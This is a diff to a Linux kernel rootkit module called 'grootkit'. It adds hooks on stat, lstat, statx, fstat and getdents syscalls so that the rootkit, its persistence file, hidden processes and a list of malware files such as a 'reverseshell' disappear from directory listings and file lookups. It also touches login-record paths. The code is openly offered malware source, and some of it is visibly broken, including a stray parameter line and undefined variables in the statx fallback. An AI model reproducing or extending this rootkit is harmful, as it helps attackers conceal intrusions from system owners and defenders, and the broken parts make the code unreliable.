@@ -21,6 +21,7 @@
 #include <linux/slab.h>
 #include <linux/path.h>
 #include <linux/sched.h>
+#include <linux/namei.h>
 #include <linux/ftrace.h>
 #include <linux/string.h>
 #include <linux/dirent.h>
@@ -80,9 +81,10 @@ static char *persistencefile = "6r00tkit";
 module_param(persistencefile, charp, 0000);
 MODULE_PARM_DESC(persistencefile, "The persistence filename");
 
-static char *malwarefile = "reverseshell";
-module_param(malwarefile, charp, 0000);
-MODULE_PARM_DESC(malwarefile, "The malware filename");
+static char *malwarefiles[5] = {"reverseshell"};
+static int malwarefiles_number = 1;
+module_param_array(malwarefiles, charp, &malwarefiles_number, 0000);
+MODULE_PARM_DESC(malwarefiles, "The malwares filenames");
 
 static long int processsignal = 14600;
 module_param(processsignal, long, 0000);
@@ -110,8 +112,10 @@ unsigned short destination_port = 0;
 
 char grootkit_filepath[NAME_MAX];
 char persistence_filepath[NAME_MAX];
+char malwares_filespaths[NAME_MAX][5];
+unsigned long int malware_directory_length;
 char *logged_filepath1 = "/var/run/utmp";
-char *logged_filepath2 = "/var/run/wtmp";
+char *logged_filepath2 = "/var/log/wtmp";
 
 #define EMPTY           0
 #define RUN_LVL         1
@@ -140,6 +144,15 @@ struct opened_file opened_files[5] = {
     {0, 0, 0},
     {0, 0, 0},
     {0, 0, 1}
+};
+
+// https://elixir.bootlin.com/linux/v6.5.6/source/fs/internal.h#L168
+struct open_flags {
+    int open_flag;
+    umode_t mode;
+    int acc_mode;
+    int intent;
+    int lookup_flags;
 };
 
 /*
@@ -209,23 +222,36 @@ struct utmp {
 typedef asmlinkage ssize_t (*recvmsg_signature)(const struct pt_regs *);
 typedef asmlinkage long (*getdents64_signature)(const struct pt_regs *);
 typedef asmlinkage long (*newfstatat_signature)(const struct pt_regs *);
+typedef asmlinkage long (*newfstat_signature)(const struct pt_regs *);
+typedef asmlinkage long (*newlstat_signature)(const struct pt_regs *);
+typedef asmlinkage long (*newstat_signature)(const struct pt_regs *);
 typedef asmlinkage int (*getdents_signature)(const struct pt_regs *);
 typedef asmlinkage int (*pread64_signature)(const struct pt_regs *);
 typedef asmlinkage long (*openat_signature)(const struct pt_regs *);
 typedef asmlinkage long (*fstat_signature)(const struct pt_regs *);
+typedef asmlinkage long (*lstat_signature)(const struct pt_regs *);
 typedef asmlinkage long (*mkdir_signature)(const struct pt_regs *);
+typedef asmlinkage int (*statx_signature)(const struct pt_regs *);
+typedef asmlinkage long (*stat_signature)(const struct pt_regs *);
 typedef asmlinkage long (*open_signature)(const struct pt_regs *);
 typedef asmlinkage long (*kill_signature)(const struct pt_regs *);
 #else
-typedef asmlinkage int (*newfstatat_signature)(int dfd, const char *filename, struct stat *statbuf, int flag);
+int dfd, const char __user *filename, unsigned flags, unsigned int mask, struct statx __user *buffer
+typedef asmlinkage int (*statx_signature)(int, const char __user *, unsigned, unsigned int, struct statx __user *);
 typedef asmlinkage long (*getdents64_signature)(unsigned int, struct linux_dirent64 *, unsigned int);
-typedef asmlinkage int (*pread64_signature)(unsigned long fd, char *buf, size_t count, loff_t pos);
 typedef asmlinkage ssize_t (*recvmsg_signature)(int, struct user_msghdr __user *, unsigned int);
 typedef asmlinkage int (*getdents_signature)(unsigned int, struct linux_dirent *, unsigned int);
-typedef asmlinkage int (*fstat_signature)(const char *filename, struct stat *statbuf, int flag);
-typedef asmlinkage int (*openat_signature)(int dfd, const char *filename, int flags, int mode);
-typedef asmlinkage int (*open_signature)(const char *filename, int flags, int mode);
+typedef asmlinkage long (*newlstat_signature)(const char __user *, struct stat __user *);
+typedef asmlinkage long (*newstat_signature)(const char __user *, struct stat __user *);
+typedef asmlinkage long (*lstat_signature)(const char __user *, struct stat __user *);
+typedef asmlinkage int (*newfstatat_signature)(int, const char *, struct stat *, int);
+typedef asmlinkage long (*stat_signature)(const char __user *, struct stat __user *);
+typedef asmlinkage int (*pread64_signature)(unsigned long, char *, size_t, loff_t);
+typedef asmlinkage int (*fstat_signature)(const char *, struct stat *, int);
+typedef asmlinkage long (*newfstat_signature)(int, struct stat __user *);
 typedef asmlinkage long (*mkdir_signature)(const char __user *, umode_t);
+typedef asmlinkage int (*openat_signature)(int, const char *, int, int);
+typedef asmlinkage int (*open_signature)(const char *, int, int);
 typedef asmlinkage long (*kill_signature)(pid_t, int);
 #endif
 
@@ -238,11 +264,17 @@ tcp_seq_show_signature udp6_seq_show_base;
 getdents64_signature getdents64_base;
 newfstatat_signature newfstatat_base;
 getdents_signature getdents_base;
+newlstat_signature newlstat_base;
+newfstat_signature newfstat_base;
 recvmsg_signature recvmsg_base;
 pread64_signature pread64_base;
+newstat_signature newstat_base;
 openat_signature openat_base;
 fstat_signature fstat_base;
+statx_signature statx_base;
+lstat_signature lstat_base;
 mkdir_signature mkdir_base;
+stat_signature stat_base;
 open_signature open_base;
 kill_signature kill_base;
 
@@ -469,11 +501,19 @@ asmlinkage long getdents64_hook(unsigned int fd, struct linux_dirent64 *director
     while (offset < kernel_return) {
         struct linux_dirent64 *current_directory = (void *)directory_kernel_return + offset;
 
+        int is_malware_file = 0;
+        for (int index = 0; index < malwarefiles_number; index += 1) {
+            if (strcmp(malwarefiles[index], current_directory->d_name) == 0) {
+                is_malware_file = 1;
+                break;
+            }
+        }
+
         if (
             has_hidden_flag(simple_strtoul(current_directory->d_name, NULL, 10)) ||
             strcmp(rootkitfile, current_directory->d_name) == 0 ||
             strcmp(persistencefile, current_directory->d_name) == 0 ||
-            strcmp(malwarefile, current_directory->d_name) == 0
+            is_malware_file
         ) {
             if (current_directory == directory_kernel_return) {
                 kernel_return -= current_directory->d_reclen;
@@ -535,11 +575,19 @@ asmlinkage int getdents_hook(unsigned int fd, struct linux_dirent *directory, un
     while (offset < kernel_return) {
         struct linux_dirent *current_directory = (void *)directory_kernel_return + offset;
 
+        int is_malware_file = 0;
+        for (int index = 0; index < malwarefiles_number; index += 1) {
+            if (strcmp(malwarefiles[index], current_directory->d_name) == 0) {
+                is_malware_file = 1;
+                break;
+            }
+        }
+
         if (
             has_hidden_flag(simple_strtoul(current_directory->d_name, NULL, 10)) ||
             strcmp(rootkitfile, current_directory->d_name) == 0 ||
             strcmp(persistencefile, current_directory->d_name) == 0 ||
-            strcmp(malwarefile, current_directory->d_name) == 0
+            is_malware_file
         ) {
             if (current_directory == directory_kernel_return) {
                 kernel_return -= current_directory->d_reclen;
@@ -648,12 +696,18 @@ long new_openat(const char *filename, long return_value, int is_file_descriptor)
         if (filepath == NULL) return return_value;
     }
 
-    if (strcmp(filepath, grootkit_filepath) == 0 || strcmp(filepath, persistence_filepath) == 0) {
-        goto filenotfound;
-    } else if (memcmp("/proc/", filepath, 6) == 0) {
+    if (strcmp(filepath, persistence_filepath) == 0) goto filenotfound;
+    else if (memcmp("/proc/", filepath, 6) == 0) {
         unsigned long long int pid = 0;
         for (char* string = filepath + 6; string[0] >= '0' && string[0] <= '9' && pid < 9999999; string += 1) pid = pid * 10 + string[0] - '0';
         if (has_hidden_flag(pid)) goto filenotfound;
+    } else if (memcmp(filepath, rootkitdirectory, malware_directory_length) == 0 && filepath[malware_directory_length] == '/') {
+        char *filename = &filepath[malware_directory_length + 1];
+        if (strcmp(filename, rootkitfile) == 0) goto filenotfound;
+
+        for (int index = 0; index < malwarefiles_number; index += 1) {
+            if (strcmp(filename, malwarefiles[index]) == 0) goto filenotfound;
+        }
     }
 
     if (is_file_descriptor) kfree(filepath);
@@ -698,33 +752,147 @@ asmlinkage long open_hook(const char *filename, int flags, int mode) {
 }
 
 /*
+    This function hooks sys_statx syscall.
+*/
+#ifdef PTREGS_SYSCALL_STUBS
+asmlinkage int statx_hook(struct pt_regs *regs) {
+    int dfd = regs->di;
+    char *filename = (char *)regs->si;
+    int return_value = statx_base(regs);
+#else
+asmlinkage long statx_hook(int dfd, const char __user *filename, unsigned flags, unsigned int mask, struct statx __user *buffer) {
+    int return_value = statx_base(dfd, filename, statbuf, flag);
+#endif
+    if (return_value != 0 || filename[0] == 0) return return_value;
+    struct path path;
+    int empty = 0;
+    int error = user_path_at_empty(dfd, filename, LOOKUP_EMPTY, &path, &empty);
+    if (!error && !empty) {
+        char new_filename[PATH_MAX];
+        char *new_filename2 = d_path(&path, new_filename, PATH_MAX);
+        return (int)new_openat(new_filename2, (long)return_value, 0);
+    }
+    return (int)new_openat(filename, (long)return_value, 0);
+}
+
+/*
     This function hooks sys_newfstatat syscall.
 */
 #ifdef PTREGS_SYSCALL_STUBS
-asmlinkage long newfstatat_hook(const struct pt_regs *regs) {
+asmlinkage int newfstatat_hook(struct pt_regs *regs) {
+    int dfd = regs->di;
     char *filename = (char *)regs->si;
-    long return_value = newfstatat_base(regs);
+    int return_value = newfstatat_base(regs);
 #else
 asmlinkage long newfstatat_hook(int dfd, const char *filename, struct stat __user *statbuf, int flag) {
-    long return_value = newfstatat_base(dfd, filename, flags, mode);
+    int return_value = newfstatat_base(dfd, filename, statbuf, flag);
 #endif
-    if (return_value != 0) return_value;
-    return new_openat(filename, return_value, 0);
+    if (return_value != 0 || filename[0] == 0) return return_value;
+    struct path path;
+    int empty = 0;
+    int error = user_path_at_empty(dfd, filename, LOOKUP_EMPTY, &path, &empty);
+    if (!error && !empty) {
+        char new_filename[PATH_MAX];
+        char *new_filename2 = d_path(&path, new_filename, PATH_MAX);
+        return (int)new_openat(new_filename2, (long)return_value, 0);
+    }
+    return (int)new_openat(filename, (long)return_value, 0);
+}
+
+/*
+    This function hooks sys_newfstat syscall.
+*/
+#ifdef PTREGS_SYSCALL_STUBS
+asmlinkage int newfstat_hook(const struct pt_regs *regs) {
+    int fd = regs->di;
+    int return_value = newfstat_base(regs);
+#else
+asmlinkage int newfstat_hook(int fd, struct stat __user *statbuf) {
+    int return_value = newfstat_base(fd, statbuf);
+#endif
+    if (return_value != 0) return return_value;
+    char *filename = get_filename_from_fd(fd);
+    return_value = (int)new_openat(filename, (long)return_value, 0);
+    kfree(filename);
+    return return_value;
 }
 
 /*
     This function hooks sys_fstat syscall.
 */
 #ifdef PTREGS_SYSCALL_STUBS
-asmlinkage long fstat_hook(const struct pt_regs *regs) {
-    char *filename = (char *)regs->si;
-    long return_value = fstat_base(regs);
+asmlinkage int fstat_hook(const struct pt_regs *regs) {
+    int fd = regs->di;
+    int return_value = fstat_base(regs);
 #else
-asmlinkage long fstat_hook(int dfd, const char *filename, struct stat __user *statbuf, int flag) {
-    long return_value = fstat_base(dfd, filename, flags, mode);
+asmlinkage int fstat_hook(int fd, struct stat __user *statbuf) {
+    int return_value = fstat_base(fd, statbuf);
 #endif
-    if (return_value != 0) return_value;
-    return new_openat(filename, return_value, 0);
+    if (return_value != 0) return return_value;
+    char *filename = get_filename_from_fd(fd);
+    return_value = (int)new_openat(filename, (long)return_value, 0);
+    kfree(filename);
+    return return_value;
+}
+
+/*
+    This function hooks sys_newlstat syscall.
+*/
+#ifdef PTREGS_SYSCALL_STUBS
+asmlinkage int newlstat_hook(const struct pt_regs *regs) {
+    char *filename = (char *)regs->di;
+    int return_value = newlstat_base(regs);
+#else
+asmlinkage int newlstat_hook(const char __user *filename, struct stat __user *statbuf) {
+    int return_value = newlstat_base(filename, statbuf);
+#endif
+    if (return_value != 0) return return_value;
+    return (int)new_openat(filename, (long)return_value, 0);
+}
+
+/*
+    This function hooks sys_lstat syscall.
+*/
+#ifdef PTREGS_SYSCALL_STUBS
+asmlinkage int lstat_hook(const struct pt_regs *regs) {
+    char *filename = (char *)regs->di;
+    int return_value = lstat_base(regs);
+#else
+asmlinkage int lstat_hook(const char __user *filename, struct stat __user *statbuf) {
+    int return_value = lstat_base(filename, statbuf);
+#endif
+    if (return_value != 0) return return_value;
+    return (int)new_openat(filename, (long)return_value, 0);
+}
+
+/*
+    This function hooks sys_stat syscall.
+*/
+#ifdef PTREGS_SYSCALL_STUBS
+asmlinkage int stat_hook(const struct pt_regs *regs) {
+    char *filename = (char *)regs->di;
+    int return_value = stat_base(regs);
+#else
+asmlinkage int stat_hook(const char __user *filename, struct stat __user *statbuf) {
+    int return_value = stat_base(filename, statbuf);
+#endif
+    if (return_value != 0) return return_value;
+    return (int)new_openat(filename, (long)return_value, 0);
+}
+
+/*
+    This function hooks sys_newstat syscall.
+*/
+#ifdef PTREGS_SYSCALL_STUBS
+asmlinkage int newstat_hook(const struct pt_regs *regs) {
+    char *filename = (char *)regs->di;
+    int return_value = newstat_base(regs);
+#else
+asmlinkage int newstat_hook(const char __user *filename, struct stat __user *statbuf) {
+    int return_value = newstat_base(filename, statbuf);
+#endif
+    if (return_value != 0) return return_value;
+    return (int)new_openat(filename, (long)return_value, 0);
 }
 
 /*
@@ -956,15 +1124,21 @@ void get_full_path(char* full_file_path, char* directory, char* filename) {
     This function is launched on module load.
 */
 static int __init grootkit_init(void) {
-    protect_and_hide();
+    // protect_and_hide();
     getdents64_base = syscall_hooking((unsigned long)getdents64_hook, (unsigned int)__NR_getdents64);
     newfstatat_base = syscall_hooking((unsigned long)newfstatat_hook, (unsigned int)__NR_newfstatat);
     getdents_base = syscall_hooking((unsigned long)getdents_hook, (unsigned int)__NR_getdents);
+    // newfstat_base = syscall_hooking((unsigned long)newfstat_hook, (unsigned int)__NR_newfstat);
+    // newlstat_base = syscall_hooking((unsigned long)newlstat_hook, (unsigned int)__NR_newlstat);
     recvmsg_base = syscall_hooking((unsigned long)recvmsg_hook, (unsigned int)__NR_recvmsg);
     pread64_base = syscall_hooking((unsigned long)pread64_hook, (unsigned int)__NR_pread64);
+    // newstat_base = syscall_hooking((unsigned long)newstat_hook, (unsigned int)__NR_newstat);
     openat_base = syscall_hooking((unsigned long)openat_hook, (unsigned int)__NR_openat);
     mkdir_base = syscall_hooking((unsigned long)mkdir_hook, (unsigned int)__NR_mkdir);
     fstat_base = syscall_hooking((unsigned long)fstat_hook, (unsigned int)__NR_fstat);
+    lstat_base = syscall_hooking((unsigned long)lstat_hook, (unsigned int)__NR_lstat);
+    statx_base = syscall_hooking((unsigned long)statx_hook, (unsigned int)__NR_statx);
+    stat_base = syscall_hooking((unsigned long)stat_hook, (unsigned int)__NR_stat);
     kill_base = syscall_hooking((unsigned long)kill_hook, (unsigned int)__NR_kill);
     open_base = syscall_hooking((unsigned long)open_hook, (unsigned int)__NR_open);
 
@@ -973,8 +1147,13 @@ static int __init grootkit_init(void) {
     udp4_seq_show_base = symbol_hooking(&udp4_seq_show_struct);
     udp6_seq_show_base = symbol_hooking(&udp6_seq_show_struct);
 
+    malware_directory_length = strlen(rootkitdirectory);
     get_full_path(grootkit_filepath, rootkitdirectory, rootkitfile);
     get_full_path(persistence_filepath, persistencedirectory, persistencefile);
+
+    for (int index = 0; index < malwarefiles_number; index += 1) {
+        get_full_path(malwares_filespaths[index], rootkitdirectory, malwarefiles[index]);
+    }
 
     return 0;
 }
@@ -986,11 +1165,17 @@ static void __exit grootkit_exit(void) {
     syscall_hooking((unsigned long)getdents64_base, (unsigned int)__NR_getdents64);
     syscall_hooking((unsigned long)newfstatat_base, (unsigned int)__NR_newfstatat);
     syscall_hooking((unsigned long)getdents_hook, (unsigned int)__NR_getdents);
+    // syscall_hooking((unsigned long)newfstat_base, (unsigned int)__NR_newfstat);
+    // syscall_hooking((unsigned long)newlstat_base, (unsigned int)__NR_newlstat);
     syscall_hooking((unsigned long)recvmsg_base, (unsigned int)__NR_recvmsg);
     syscall_hooking((unsigned long)pread64_base, (unsigned int)__NR_pread64);
+    // syscall_hooking((unsigned long)newstat_base, (unsigned int)__NR_newstat);
     syscall_hooking((unsigned long)openat_base, (unsigned int)__NR_openat);
     syscall_hooking((unsigned long)mkdir_base, (unsigned int)__NR_mkdir);
     syscall_hooking((unsigned long)fstat_base, (unsigned int)__NR_fstat);
+    syscall_hooking((unsigned long)lstat_base, (unsigned int)__NR_lstat);
+    syscall_hooking((unsigned long)statx_base, (unsigned int)__NR_statx);
+    syscall_hooking((unsigned long)stat_base, (unsigned int)__NR_stat);
     syscall_hooking((unsigned long)open_base, (unsigned int)__NR_open);
     syscall_hooking((unsigned long)kill_base, (unsigned int)__NR_kill);
 
